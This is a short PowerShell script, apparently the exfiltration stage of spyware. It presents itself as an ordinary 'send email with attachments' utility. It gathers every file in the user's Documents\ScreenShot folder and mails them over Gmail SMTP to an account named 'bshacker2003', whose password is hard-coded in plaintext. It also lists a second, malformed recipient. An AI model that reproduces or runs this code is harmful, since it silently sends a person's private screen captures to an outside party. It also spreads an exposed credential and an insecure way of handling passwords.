############################################################################
# Sending email with attachments
#############################################################################

#Connection Details
$username="bshacker2003@gmail.com"
$password="PommesPizza"
$smtpServer = "smtp.gmail.com"
$msg = new-object Net.Mail.MailMessage

#SMTP connection
$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 

#SSL tunnel to communicate   
$smtp.EnableSsl = $true

$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)

#From Address
$msg.From = "bshacker2003@gmail.com"

#To Address, Copy the below line for multiple recipients
$msg.To.Add("bshacker2003@gmail.com")
$msg.To.Add("stromphysiker.com")

#Message Body
$msg.Body="Please See Attached Files"

#Message Subject
$msg.Subject = "Email with Multiple Attachments"

#your file location
$files=Get-ChildItem "$env:USERPROFILE\Documents\ScreenShot\"

Foreach($file in $files)
{
Write-Host "Attaching File :- " $file
$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
$msg.Attachments.Add($attachment)

}
$smtp.Send($msg)
write-host "	Mail Sent"
$attachment.Dispose();
$msg.Dispose();
